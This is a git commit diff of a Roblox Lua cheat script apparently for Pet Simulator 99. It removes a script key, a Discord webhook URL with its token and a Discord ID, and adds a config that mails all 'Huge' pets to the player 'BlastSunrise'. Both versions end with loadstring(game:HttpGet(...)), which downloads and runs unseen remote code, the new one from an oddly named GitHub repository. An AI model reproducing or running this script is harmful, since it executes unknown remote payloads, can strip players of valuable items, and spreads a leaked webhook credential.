8ac17827b4f5795660ac4c3865e0bcc758f9fbb2
smilegaming050-droid <smilegaming050@gmail.com>
2026-05-10 22:46:42 +0700

    Update Tuanga.lua

--- Tuanga.lua
+++ Tuanga.lua
@@ -1,9 +1,15 @@
-setfpscap(5)
-script_key = "eWFyRNEvzKElQinNBYTjrpJIZEOixLsZ";
-getgenv().UserConfig = {
-    ["Webhook URL"] = "https://discord.com/api/webhooks/1420694714423705640/k6Bf2AaSaHHScKSyH0HMgGxbRxszIFwBs5BZ3QmI8wINHi2VF8n3xV342ITrQuk1zESE",
-    ["Webhook Ping"] = {"Huge", "Titanic", "Gargantuan"}, -- xoa normal de khong spam webhook
-    ["Webhook Note"] = "Pet99",
-    ["Discord ID"] = "765845940074053633",
+key = "hoangtuanhoangtu3";
+getgenv().CONFIG = {
+    ITEMS_TO_MAIL = {
+        ["Pet"] = {
+            ["All Huges"] = {MaxMailCost = 100_000},
+        },
+
+    },
+
+
+    PLAYER_TO_MAIL = {"BlastSunrise"}, --//INF NICKNAME
+
+
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a569c6d231092c9a6d71d6da15e689a0.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/karman4ik881/TeardownMods/refs/heads/main/Phello"))()
